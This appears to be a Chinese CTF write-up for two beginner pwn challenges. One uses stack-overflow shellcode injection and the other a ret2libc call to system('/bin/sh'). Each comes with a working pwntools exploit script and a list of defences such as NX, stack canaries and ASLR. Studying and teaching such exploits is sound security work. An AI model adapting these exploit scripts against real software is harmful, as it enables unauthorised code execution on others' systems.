
## 题目名
<h2>level1_shellcode</h2>
### 漏洞分析

![avatar](level1.png)

<h4><strong>checksec</strong> 发现什么保护都没没有开启,执行程序发现貌似提供了一个地址，而且三次执行还都在变化,由于是32位文件，所以丢进IDA中,F5</h4>
![avatar](7f9e11c2bc84884de146673bdc1d0a5.png)
<h4>在IDA ，看到先进入vunlnerable函数,后回显一句话进入vunlnerable,看看</h4>
![avatar](00ad2f69d80ed07b6343217796e2263.png)
![avatar](1df202b8523f64b146a9677403649f1.png)


<h4>看到buf,应该是栈上的变量，可知偏移量：(0x88+4),之后再填返回地址，由于可填充的字节较长，且没有任何保护，加之ida中没看到system('/bin/sh'),所以用shellcode进行攻击，即在栈区填充shellcode的代码，之后再执行，所以需要执行代码的起始地址，即buf的首地址</h4>
### 漏洞利用
代码


	Python
	from pwn import *

	context.log_level='debug'
	io = process('./level1_shellcode')
	shellcode = asm(shellcraft.sh())
	buffer=io.recvline()[14:-2]
	buf_addr = int(buffer,16)
	payload = shellcode + '\x90' * (0x88+0x4-len(shellcode)) + p32(buf_addr)
	io.sendline(payload)
	io.interactive()
	io.close()

![avatar](level11.png)

### 漏洞防护
<h4>防护手段：1.可以设置buf所在的区域（栈）不可执行，即使栈只用来存储数据，而不能执行这些数据（执行的时候是当指令了），可以开启NX保护</h4>
  <h4>2.设置检查机制，想办法在ret之前对数据设立随机值(由系统生成，传递至某一位置)，有点像关卡，比如金丝雀保护</h4>
 <h4>3.编译时使用指令，令栈不可执行 4.开启ALSR，是堆栈地址随机化，从而无法确定攻击代码的其实地址，ret的覆写值难以确定。</h4>
## 题目名
<h2>level2_return_to_libc</h2>
### 漏洞分析


![avatar](level2.png)


<h4><strong>checksec</strong>开启NX,shellcode 得凉，执行程序发现可以输入，，有与可执行文件名含libc，<strong>file</strong>一下，是动态链接文件，ldd查看依赖的共享库，之后放到IDA中，可以看到乍一看level1很像，但不一样，一开始就调用了libc库中的system函数，自然想到可能有/bin/sh,Shift F12看到/bin/sh在.data</h4>



![avatar](342b2aa1f47faddb88cec5a2d246d8c.png)


![avatar](178e3f94079c290771e4e36200ba860.png)
<h4>利用ROP，objdump分别查找对应地址</h4>

![avatar](level22.png)

![avatar](1919808-20200218101903926-1643655401.png)

<h4>借别的大佬的图理解这个漏洞</h4>
### 漏洞利用
代码
	from pwn import*

	context.log_level='debug'

	p=process('./level2_return_to_libc')


	binsh_addr=0x0804a024  #which is in .data ,it may be in libc.so at first
	#system@plt=0x08048320
	system_plt=0x08048320
	payload=(0x88+0x4)*'a'+p32(system_plt)+'cccc'+p32(binsh_addr)

	p.recvuntil('\n')
	p.send(payload)
	p.interactive()

![avatar](level23.png)

### 漏洞防护

<h4>1.ALSR开启，是动态库的装载地址不确定，从而难以确定函数地址 </h4>
<h4>2.设置检查机制，想办法在ret之前对数据设立随机值(由系统生成，传递至某一位置)，有点像关卡，比如金丝雀保护，进行栈的保护，以防止篡改ret_address</h4>
